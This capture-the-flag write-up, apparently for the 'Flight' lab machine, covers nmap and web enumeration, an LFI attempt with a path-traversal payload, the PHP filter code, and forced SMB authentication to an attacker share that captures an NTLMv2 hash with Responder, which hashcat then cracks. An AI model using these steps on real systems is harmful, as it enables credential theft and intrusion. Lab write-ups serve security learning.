@@ -1,0 +1,120 @@
+Checking open ports with nmap:
+
+nmap -p- $IP
+
+Host is up (0.30s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+
+We check the website adding the IP to our /etc/hosts file. Nothing interesting was found on the main website.
+We run gobuster:
+gobuster dir -u http://flight.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+obuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://flight.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Timeout:                 10s
+===============================================================
+2023/02/12 01:00:21 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 333] [--> http://flight.htb/images/]
+/Images               (Status: 301) [Size: 333] [--> http://flight.htb/Images/]
+/css                  (Status: 301) [Size: 330] [--> http://flight.htb/css/]
+/js                   (Status: 301) [Size: 329] [--> http://flight.htb/js/]
+/examples             (Status: 503) [Size: 399]
+/licenses             (Status: 403) [Size: 418]
+/IMAGES               (Status: 301) [Size: 333] [--> http://flight.htb/IMAGES/]
+/%20                  (Status: 403) [Size: 299]
+/*checkout*           (Status: 403) [Size: 299]
+/CSS                  (Status: 301) [Size: 330] [--> http://flight.htb/CSS/]
+/JS                   (Status: 301) [Size: 329] [--> http://flight.htb/JS/]
+/phpmyadmin           (Status: 403) [Size: 418]
+
+Then we started checking for subdomains using wfuzz
+
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" but we get a lot of responses so we use:
+
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hl 154 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://flight.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000000624:   200        90 L     412 W      3996 Ch     "school" 
+
+As we found the subdomain "school" we continue to enumerate "school.flight.htb" and if we navigate through the site we have a parameter "view".
+http://school.flight.htb/index.php?view=home.html
+
+so we check for an LFI.
+
+http://school.flight.htb/index.php?view=../../../../../../../../etc/passwd 
+
+getting an error message of 
+
+"Suspicious Activity Blocked!
+Incident will be reported"
+
+After research for LFI on a windows machine we got to the conclusion that we can check for the website source code and see if we can bypass the filters.
+Knowing that it is an Apache server the code is inside the C:/xampp/htdocs directory, so we check at C:/xampp/htdocs/school.flight.htb/index.php and get our source code
+
+<?php
+
+ini_set('display_errors', 0);
+error_reporting(E_ERROR | E_WARNING | E_PARSE); 
+
+if(isset($_GET['view'])){
+$file=$_GET['view'];
+if ((strpos(urldecode($_GET['view']),'..')!==false)||
+    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
+    (strpos(urldecode($_GET['view']),'\\')!==false)||
+    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
+    (strpos(urldecode($_GET['view']),'.shtml')!==false)
+){
+    echo "<h1>Suspicious Activity Blocked!";
+    echo "<h3>Incident will be reported</h3>\r\n";
+}else{
+    echo file_get_contents($_GET['view']);	
+}
+}else{
+    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
+}
+
+The url validation prevents us from doing LFI. But we can use this code to force the service to fetch a remote source using Windows network share syntax: //ip>/<share> attempt to capture the hash of a service and try crackingit with hashcat.
+
+For that we use Responder tool
+Responder is an inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request.
+
+responder -I tun0 -wPv to our attacking machine and listenint for events.
+http://school.flight.htb/index.php?view=//our-ip/attack
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:30866f304dbafe33:0F3BA561FA96C33D1DBB87759BE70BDF:01010000000000000065C928853ED90110322A2CAAD8BE2100000000020008004400530045004C0001001E00570049004E002D0043005900470055003100510035004A0043004C00420004003400570049004E002D0043005900470055003100510035004A0043004C0042002E004400530045004C002E004C004F00430041004C00030014004400530045004C002E004C004F00430041004C00050014004400530045004C002E004C004F00430041004C00070008000065C928853ED901060004000200000008003000300000000000000000000000003000001EB8C1A06BD507B37AE6622AD5B8823076541FF6940837A8A6F2D830D9E6BF9F0A00100000000000
+
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt and we get the password.
